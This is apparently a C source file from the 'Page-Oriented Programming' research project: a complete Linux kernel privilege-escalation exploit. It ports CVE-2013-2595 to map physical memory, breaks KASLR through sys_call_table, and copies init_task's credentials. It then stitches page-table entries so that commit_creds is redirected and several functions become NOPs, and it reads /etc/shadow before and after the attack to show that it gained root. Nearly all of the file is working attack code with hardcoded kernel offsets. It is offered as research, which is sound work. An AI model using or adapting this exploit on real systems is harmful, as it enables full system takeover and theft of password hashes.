/**
 *                   Page-Oriented Programming (POP)
 *                   -------------------------------
 *
 *                   Copyright (C) 2023 Seunghun Han
 *                 at the Affiliated Institute of ETRI
 * Project link: https://github.com/kkamagui/page-oriented-programming 
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include "cve_struct.h"

// ======================================================
// Porting CVE-2013-2595
// Port to 64bit
struct msm_mem_map_info {
	//uint32_t cookie;
	//uint32_t length;
	//uint32_t mem_type;
	uint64_t cookie;
	uint64_t length;
	uint64_t mem_type;
};

#define MSM_MEM_MMAP		0
#define MSM_CAM_IOCTL_MAGIC 'm'
#define MSM_CAM_IOCTL_SET_MEM_MAP_INFO			\
	_IOR(MSM_CAM_IOCTL_MAGIC, 41, struct msm_mem_map_info *)
// ======================================================

typedef struct page_modification
{
	unsigned long src_addr; 	// Address of source function
	unsigned long dst_addr;		// Address of destination function
	unsigned long bak_addr;		// Backup physical address of destination function
} PAGE_MOD;

//=============================================================================
// Configuration block
// Signature of text seciton
char text_sig[] = {
	0x48, 0x8d, 0x25, 0x51, 0x3f, 0x00, 0x02, 0x48, 0x8d, 0x3d, 0xf2, 0xff, 0xff, 0xff, 0xb9, 0x01, \
	0x01, 0x00, 0xc0, 0x48, 0x8b, 0x05, 0x1e, 0x69, 0x31, 0x02, 0x48, 0xc7, 0xc2 
};
struct cve_config g_config = {0x100000, (uint64_t) 16 * 1024 * 1024 * 1024, 0, 0, 1};

// Offset of variables (from cve_find_symbols)
#define TEXT_OFFSET_SYS_CALL_TABLE 		0x1400400
#define TEXT_OFFSET_PAGE_OFFSET_BASE 	0x19D7008
#define TEXT_OFFSET_PER_CPU_OFFSET		0x19DD9E0	// __per_cpu_offset
#define TEXT_OFFSET_INIT_TASK			0x201BB00
#define TEXT_OFFSET_SYS_READ			0x46FDA0	// __x64_sys_read
// Default _text address
#define TEXT_NOKASLR_START_ADDRESS		0xFFFFFFFF81000000

// Page stitching
PAGE_MOD page_mod_list[] =
{
	// Source, Target, Backup
	// ffff88846f600000, 31b40
	{0x31b40, 0x3bbb40, 0}, 	// Move: gs_base + pcpu_hot -> pcpu_hot <+ 0x38a000>
	{0xffffffff811253b0, 0xffffffff814af3b0, 0}, 	// Move: commit_creds() -> commit_creds() <+ 0x38a000>
	{0xffffffff846178a8, 0xffffffff849a18a8, 0},	// Move: suid_dumpable -> suid_dumpable variable <+ 0x38a000>
	{0xffffffff81a23c60, 0xffffffff81806c60, 0},	// Replace with nop: NOP gadget -> set_dumpable() <+ 0x38a000> 
	{0xffffffff811296c0, 0xffffffff814b36c0, 0},	// Move: inc_rlimit_ucounts() and del_rlimit_ucounts() -> inc_rlimit_ucounts() <+ 0x38a000> 
	{0xffffffff8164fba0, 0xffffffff819d9ba0, 0},	// Move: key_fsuid_changed() and key_fsgid_changed() -> key_fsuid_changed() and key_fsgid_changed() <+ 0x38a000>
	{0xffffffff81428ed0, 0xffffffff81e4bed0, 0},	// Replace with nop: NOP gadget -> proc_id_connector <+ 0x38a000>
	{0xffffffff82056a80, 0xffffffff81536a80, 0},	// Replace with nop: NOP gadget -> call_rcu <+ 0x38a000>
};
//=============================================================================

/**
 *	Printf for debugging
 */
void dbg_printf(const char* format, ...)
{
	if (g_config.debug == 1)
	{
		va_list args;
		va_start(args, format);
		vprintf(format, args);
		va_end(args);
	}
}

/*
 *	phys_to_virt for user space
 */
void *user_phys_to_virt(void* phys)
{
	return g_config.phy_mapped_address + (uint64_t)phys - g_config.phy_start;
}

/**
 * 	virt_to_phys for user space
 */
void *user_virt_to_phys(void* user_virt)
{
	return (void*)((uint64_t)user_virt - (uint64_t)g_config.phy_mapped_address + g_config.phy_start);
}	

/*
 * 	virt_to_phys for kernel space
 */
void *kernel_virt_to_phys(void* virt)
{
	if ((uint64_t) virt < g_config.kernel_start_address)
	{
		return (void*)((uint64_t)virt - g_config.page_offset_base);
	}
	else
	{
		return (void*)((uint64_t)virt - g_config.kernel_start_address + g_config.abs_text_section_offset);
	}
}

/*
 *	Convert kernel virtual to user virtual
 */
void *convert_kernel_virt_to_user_virt(void* virt)
{
#if 0
	if ((uint64_t) virt < g_config.kernel_start_address)
	{
		return (void*)((uint64_t)virt - g_config.page_offset_base - \
				g_config.phy_start + g_config.phy_mapped_address);
	}
	else
	{
		return (void*)((uint64_t)virt - g_config.kernel_start_address + \
				g_config.rel_text_section_offset + g_config.phy_mapped_address);
	}
#endif
	uint64_t phys_addr;

	// Retrieving the physical address
	phys_addr = (uint64_t)kernel_virt_to_phys(virt);

	// Converting it to the user space address
	return (void*)(phys_addr - g_config.phy_start + g_config.phy_mapped_address);
}


/**
 *	For syscall
 */
int raw_syscall64()
{
    ssize_t ret;
	uint64_t new_cred;

	new_cred = g_config.kernel_new_cred_address;

	// Argument: rdi, rsi, rdx, rcx, r8 ,r9, and stacks
#if 1
	asm volatile
    (
        "mov $197, %%rax					\n\t"
        "mov %0,   %%rdi	# New cred PTR 	\n\t"
		"mov $0x0, %%rsi					\n\t"
        "mov $0x0, %%rdx					\n\t"
        "mov $0x0, %%rcx					\n\t"
        "syscall"
		: /* no outputs. */
		: "m" (new_cred)
		/* no clobbers. */
    );
#else
	asm volatile
    (
        "mov $197, %rax\n"
        "mov $0xffff8880003ff000, %rdi\n" // New cred PTR
        "mov $0x0, %rsi\n"
        "mov $0x0, %rdx\n"
        "mov $0x0, %rcx\n"
        "syscall"
    );
#endif

    return ret;
}

/**
 *	For int 0x80
 */
int raw_syscall32()
{
    ssize_t ret;
	uint32_t new_cred;

	new_cred = g_config.kernel_new_cred_address;

	// Argument: rbx, rcx, edx, esi, edi, and stacks 
#if 1
	asm volatile
    (
        "mov $197, %%eax					\n\t"
        "mov %0,   %%ebx	# New cred PTR	\n\t"
        "mov $0x00, %%ecx					\n\t"
        "mov $0x00, %%edx					\n\t"
        "mov $0x00, %%esi					\n\t"
        "mov $0x00, %%edi					\n\t"
		"int $0x80"
		: /* no outputs. */
		: "m" (new_cred)
		/* no clobbers. */
    );
#else
	asm volatile
    (
        "mov $0, %rax\n"
        "mov $0x003ff000, %rbx\n"		// First argument
        "mov $0x00, %rcx\n"
        "mov $0x00, %rdx\n"
        "mov $0x00, %rsi\n"
        "mov $0x00, %rdi\n"
		"int $0x80"						// Execute the system call
    );
#endif

    return ret;
}

/**
 *	sysenter
 */
int raw_syscall32_2()
{
    ssize_t ret;
	uint32_t new_cred;

	new_cred = g_config.kernel_new_cred_address;

	// Argument: rbx, rcx, edx, esi, edi, and stacks 
#if 1
	asm volatile
    (
        "mov $197, %%eax					\n\t"
        "mov %0,   %%ebx	# New cred PTR	\n\t"
        "mov $0x00, %%ecx					\n\t"
        "mov $0x00, %%edx					\n\t"
        "mov $0x00, %%esi					\n\t"
        "mov $0x00, %%edi					\n\t"
		"sysenter"
		: /* no outputs. */
		: "m" (new_cred)
		/* no clobbers. */
    );
#else
	asm volatile
    (
        "mov $0, %rax\n"
        "mov $0x003f0000, %rbx\n"		// First argument
        "mov $0x00, %rcx\n"
        "mov $0x00, %rdx\n"
        "mov $0x00, %rsi\n"
        "mov $0x00, %rdi\n"
		"sysenter"						// Execute the system call
    );
#endif
    return ret;
}

/**
 *	Read the /etc/shadow file
 */
int cat_etc_shadow()
{
	char buf[4096];

	int fd = open("/etc/shadow", O_RDONLY);

	if (fd == -1)
	{
		fprintf(stderr, "       ==> Access denied.\n");
		return -1;
	}

	fprintf(stderr, "=======================================================\n");

	read(fd, buf, sizeof(buf) -1);
	buf[sizeof(buf) - 1] = '\0';
	fprintf(stderr, "%s", buf);
	close(fd);

	fprintf(stderr, "=======================================================\n");

	return 0;
}

/**
 *	CVE-2013-2595 trigger
 */
void* map_physical_memory(uint64_t size)
{
	int fd;
	char* mapped_address;
	struct msm_mem_map_info arg;
	unsigned long start = 0;
	unsigned long i;

	printf("size_t size %ld, off_t size %ld\n", sizeof(size_t), sizeof(off_t));

	fd = open("/dev/cve_config0", O_RDWR);
	if (fd < 0)
	{
		printf("/dev/cve_config0 open fail\n");
		exit(-1);
	}

	arg.cookie = g_config.phy_start;
	arg.length = size;
	arg.mem_type = MSM_MEM_MMAP;

	if (ioctl(fd, MSM_CAM_IOCTL_SET_MEM_MAP_INFO, &arg) < 0)
	{
		printf("/dev/cve_config0 ioctl fail\n");
		exit(-1);
	}

	mapped_address = mmap(&start, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (mapped_address == MAP_FAILED)
	{
		printf("/dev/cve_config0 mmap fail\n");
		exit(-1);
	}

	printf("System physical memory is mapped at %016lX\n", (unsigned long) mapped_address);
	g_config.fd = fd;

	return mapped_address;
}

/**
 *	Hexdump
 */
void hexdump(char *desc, void *addr, int len) 
{
    int i;
    unsigned char buf[17];
    unsigned char *pc = (unsigned char*)addr;

    if (desc != NULL)
	{
        printf ("%s:\n", desc);
	}

    for (i = 0; i < len; i++)
	{
        if ((i % 16) == 0)
		{
            if (i != 0)
			{
                printf("  %s\n", buf);
			}
            printf("   %04x ", i);
        }

        printf(" %02x", pc[i]);

        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
		{
            buf[i % 16] = '.';
        }
		else
		{
            buf[i % 16] = pc[i];
        }

        buf[(i % 16) + 1] = '\0';
    }

	// Padding
    while ((i % 16) != 0)
	{
        printf("   ");
        i++;
    }

	// Remains of ASCII buffer
    printf("  %s\n", buf);
}

/**
 *	Find text section with the signature.
 */
uint64_t find_kernel_text_section(char* mapped_address, uint64_t size)
{
	uint64_t i;

	fprintf(stderr, "Finding the signature of _text section\n");
	hexdump("   [*] _text's signature is", text_sig, sizeof(text_sig));

	// Text is typically at 0x1000000
	for (i = 0 ; i < size ; i += 0x100000)
	{
		//fprintf(stderr, "Read at %016lX:\n", i + g_config.phy_start);
		
		// Skip special purpose areas such as PCI and ACPI
		if (((uint64_t)0x78000000 <= (i + g_config.phy_start)) && ((i + g_config.phy_start) < (uint64_t)0x100000000))
		{
			//printf("skip!!\n");
			continue;
		}

		if (mapped_address[i] != text_sig[0])
		{
			continue;
		}

		if (memcmp(mapped_address + i, text_sig, sizeof(text_sig)) == 0)
		{
			fprintf(stderr, "\n   [*] _text is found!\n");
			fprintf(stderr, "%016lX:\n", i + g_config.phy_start);
			hexdump("The result is", mapped_address + i, 32);
			return i;
		}
	}

	return 0;
}

/**
 *	Find the current task with the comm name.
 */
struct task_struct* find_cur_task(char* name)
{
	int i;
	struct task_struct* p;
	char name_buffer[TASK_COMM_LEN + 1];

	p = (struct task_struct*) g_config.user_init_task_address;

	while(1)
	{
		memcpy(name_buffer, p->comm, TASK_COMM_LEN);
		name_buffer[TASK_COMM_LEN] = '\0';
		//printf("task name: %s\n", name_buffer);

		if (strcmp(name_buffer, name) == 0)
		{
			return p;
		}

		p = next_task(p);
		p = convert_kernel_virt_to_user_virt(p);
		if ((uint64_t)p == (uint64_t)g_config.user_init_task_address)
		{
			break;
		}
	}

	return NULL;
}

/**
 *	Prepare TLB flushing.
 */
void prepare_tlb_flush(struct mm_struct* mm)
{
	unsigned long i;

	for (i = 0 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
	{
		change_g_bit(mm, page_mod_list[i].dst_addr, 0);
	}
}


/**
 *	Main
 */
int main(int argc, char** argv)
{
    int fd;
	int i;
	int fail = 0;
	uint64_t size = (uint64_t) 32 * 1024 * 1024 * 1024;
	uint64_t* ptr = 0;
	char* task_name = "cve_main";
	struct task_struct* user_init_task;
	struct task_struct* user_cur_task;
	struct mm_struct cur_mm;
	struct cred* user_init_cred;
	struct cred* user_new_cred;
	uint64_t* user_org_cr3;
	uint64_t* kernel_new_cr3;
	uint64_t* user_new_cr3;
	uint64_t src_paddr = 0;
	uint64_t dst_paddr = 0;

	g_config.phy_mapped_address = map_physical_memory(size);
	g_config.rel_text_section_offset = find_kernel_text_section(g_config.phy_mapped_address, size);

	printf("Physical address of text section: %016lX\n", g_config.rel_text_section_offset + g_config.phy_start);
	g_config.abs_text_section_offset = g_config.rel_text_section_offset + g_config.phy_start;
	
	ptr = user_phys_to_virt((void*)(TEXT_OFFSET_PAGE_OFFSET_BASE + g_config.abs_text_section_offset));
	printf("Value of page_offset_base: %016lX\n", *ptr);
	g_config.page_offset_base = *ptr;

	ptr = user_phys_to_virt((void*)(TEXT_OFFSET_PER_CPU_OFFSET + g_config.abs_text_section_offset));
	printf("Value of __per_cpu_offset: %016lX\n", *ptr);
	g_config.per_cpu_offset = *ptr;

	// Update per_cpu_offset for CPU 0
	printf("Update per_cpu_offset %016lX\n", (uint64_t)g_config.per_cpu_offset);
	page_mod_list[0].src_addr += g_config.per_cpu_offset;
	page_mod_list[0].dst_addr += g_config.per_cpu_offset;

	// Break KASLR
	ptr = user_phys_to_virt((void*)(TEXT_OFFSET_SYS_CALL_TABLE + g_config.abs_text_section_offset));
	printf("\nBreak KASLR ...\n");
	printf("   [*] First value of sys_call_table (__x64_sys_read): %016lX\n", *ptr);
	printf("   [*] Offset from _text of __x64_sys_read: %016lX\n", TEXT_OFFSET_SYS_READ);
	printf("   [*] _text is at: %016lX\n", *ptr - TEXT_OFFSET_SYS_READ);
	printf("   [*] Update the remapping table ... (+ %lX)\n", 
			g_config.kernel_start_address - TEXT_NOKASLR_START_ADDRESS);
	g_config.kernel_start_address = *ptr - TEXT_OFFSET_SYS_READ;
	for (i = 1 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
	{
		printf("      => [%d] Src: %016lX Dst: %016lX --> ", 
			i, page_mod_list[i].src_addr, page_mod_list[i].dst_addr);

		page_mod_list[i].src_addr += g_config.kernel_start_address - TEXT_NOKASLR_START_ADDRESS;
		page_mod_list[i].dst_addr += g_config.kernel_start_address - TEXT_NOKASLR_START_ADDRESS;

		printf("Src: %016lX Dst: %016lX\n",
			page_mod_list[i].src_addr, page_mod_list[i].dst_addr);
	}
	printf("   [*] Complete.\n");

	printf("\nFinding the current process ...\n");
	// Find all tasks in the task list.
	ptr = user_phys_to_virt((void*)(TEXT_OFFSET_INIT_TASK + g_config.abs_text_section_offset));
	printf("   [*] Pointer of init_task: %016lX\n", (uint64_t)ptr);
	g_config.user_init_task_address = (uint64_t)ptr;

	user_cur_task = (struct task_struct*)ptr; 
	printf("   [*] Value of init_task->tasks->next: %016lX\n", (uint64_t)(user_cur_task->tasks.next));

	user_cur_task = (struct task_struct*) find_cur_task(task_name);	
	if (user_cur_task != NULL)
	{
		printf("   [*] %s is at: %016lX\n", task_name, (uint64_t)user_cur_task);
		printf("   [*] mm of %s is %016lX\n", task_name, (uint64_t)user_cur_task->mm);
		ptr = convert_kernel_virt_to_user_virt(user_cur_task->mm);
		g_config.user_cur_mm_address = (uint64_t)ptr;

		printf("   [*] PGD of %s is %016lX\n", task_name, (uint64_t)(((struct mm_struct*)ptr)->pgd));
		g_config.kernel_org_cr3 = (uint64_t)(((struct mm_struct*)ptr)->pgd);
		ptr = convert_kernel_virt_to_user_virt(((struct mm_struct*)ptr)->pgd);
		// Set user space pgd to cur_mm->pgd
		cur_mm.pgd = (pgd_t*)ptr;
#if 0
		// Dump page table!
		printf("   [*] Dump CR3 of the current task ...\n");
		for (i = 0 ; i < 4096 / 8 ; i++)
		{
			if (ptr[i] != 0)
			{
				printf("      => [%04d] %016lX\n", i, ptr[i]);
			}
		}
#endif
		printf("   [*] Complete.\n");

		fprintf(stderr, "\n=====================================================\n");
		fprintf(stderr, "Show current privilege and read the /etc/shadow file.\n");
		fprintf(stderr, "=====================================================\n");
		fprintf(stderr, "   [*] Check privilege.\n");
		fprintf(stderr, "       ==> ");
		system("id");
		sleep(1);

		fprintf(stderr, "\n   [*] Trying to read the /etc/shadow file.\n");
		// Read /etc/shadow
		cat_etc_shadow();
		sleep(1);
	
		// Disable all debugging messages.
		g_config.debug = 0;

		// Do page stitching!
		fprintf(stderr, "\n");
		fprintf(stderr, "==========================================\n");
		fprintf(stderr, "Starting Page-Oriented Programming (POP).\n");
		fprintf(stderr, "==========================================\n");
		// Clear G bits.
		printf("\nRemoving the g bit from the remapping targets.\n");
		prepare_tlb_flush(&cur_mm);
		printf("   [*] Complete.\n");

		// Create new task struct.
		user_init_task = (struct task_struct*)g_config.user_init_task_address;
		g_config.kernel_new_cred_address = get_free_page();
		printf("\nPrepare new creds ...\n");
		printf("   [*] New cred address %016lX, Init_task's cred %016lX\n", 
				g_config.kernel_new_cred_address, (uint64_t)(user_init_task->real_cred));
		user_new_cred = (struct cred*) convert_kernel_virt_to_user_virt((void*)(g_config.kernel_new_cred_address));
		user_init_cred = (struct cred*) convert_kernel_virt_to_user_virt((void*)(user_init_task->real_cred));
		memcpy(user_new_cred, user_init_cred, 0x1000);
		user_new_cred->thread_keyring = NULL;
		printf("   [*] Complete\n");

		// Replace CR3 value to build private page tables.
		printf("\nCreate new CR3 ...\n");
		kernel_new_cr3 = get_free_page();
		printf("   [*] Allocated new CR3: %016lX\n", (uint64_t)kernel_new_cr3);
		user_new_cr3 = convert_kernel_virt_to_user_virt(kernel_new_cr3);
		user_org_cr3 = convert_kernel_virt_to_user_virt(((struct mm_struct*)(g_config.user_cur_mm_address))->pgd);
		memcpy(user_new_cr3, user_org_cr3, 0x1000);

		// Update current->mm->pgd and cur_mm->pgd
		((struct mm_struct*)g_config.user_cur_mm_address)->pgd = (pgd_t*)kernel_new_cr3;
		cur_mm.pgd = (pgd_t*)user_new_cr3;
		printf("   [*] Complete\n");

		fprintf(stderr, "\nPage stitching ...\n");

#if 0
		// Remapping the new cred to the under 4 GB address space for 32 bit system calls if needed.
		printf("   [*] Remapping the new_cred from 0x%lX to 0x%lX for exploitation\n", g_config.kernel_new_cred_address, (unsigned long) g_config.kernel_new_cred_address & 0xffffffff);
		src_paddr = travel_kernel_vaddr_to_paddr(&cur_mm, (unsigned long) g_config.kernel_new_cred_address);
		replace_paddr(&cur_mm, (unsigned long) g_config.kernel_new_cred_address & 0xffffffff, src_paddr);
#endif

		for (i = 0 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
		{
			// Backup physical page of destination address.
			dst_paddr = travel_kernel_vaddr_to_paddr(&cur_mm, page_mod_list[i].dst_addr);
			page_mod_list[i].bak_addr = dst_paddr;
			
			// Replace physical page of destination address to the one of source address.
			src_paddr = travel_kernel_vaddr_to_paddr(&cur_mm, page_mod_list[i].src_addr);

			printf("   [*] Remapping and replacing PA: 0x%lX (of VA: 0x%lX) to VA: 0x%lX\n",
				src_paddr, page_mod_list[i].src_addr, page_mod_list[i].dst_addr);
		}
		printf("   [*] Complete.\n");

		// Do page stitching!
		printf("\nPage flushing and exploitation ... \n");

		// Remapping in short time	
		for (i = 0 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
		{
			// Replace physical page of destination address to the one of source address.
			src_paddr = travel_kernel_vaddr_to_paddr(&cur_mm, page_mod_list[i].src_addr);
			if (src_paddr != 0xFFFFFFFFFFFFFFFF)
			{
				//fprintf(stderr, "   [*] dst_addr: %016lX, dst_paddr: %016lX, src_paddr: %016lX\n", page_mod_list[i].dst_addr, page_mod_list[i].bak_addr, src_paddr);
				replace_paddr(&cur_mm, page_mod_list[i].dst_addr, src_paddr);
			}
		}
		printf("   [*] Total %d free pages are used ...\n", g_config.free_page_index);

		sleep(60);
		
		raw_syscall64();

		// Recover page tables and page flushing again ...
		for (i = 0 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
		{
			if (page_mod_list[i].bak_addr != 0)
			{
				replace_paddr(&cur_mm, page_mod_list[i].dst_addr, page_mod_list[i].bak_addr);
			}
		}

		sleep(60);
		
		fprintf(stderr, "   [*] Complete.\n");
		sleep(1);

		fprintf(stderr, "\n   [*] Trying to read the /etc/shadow file again!\n");
		// Read the /etc/shadow file
		cat_etc_shadow();
		sleep(1);

		fprintf(stderr, "\n   [*] Check privilege again.\n");
		fprintf(stderr, "       ==> ");
		if (fork() == 0)
		{
			system("id");
		}

		while(1);
	}

	return 0;
}
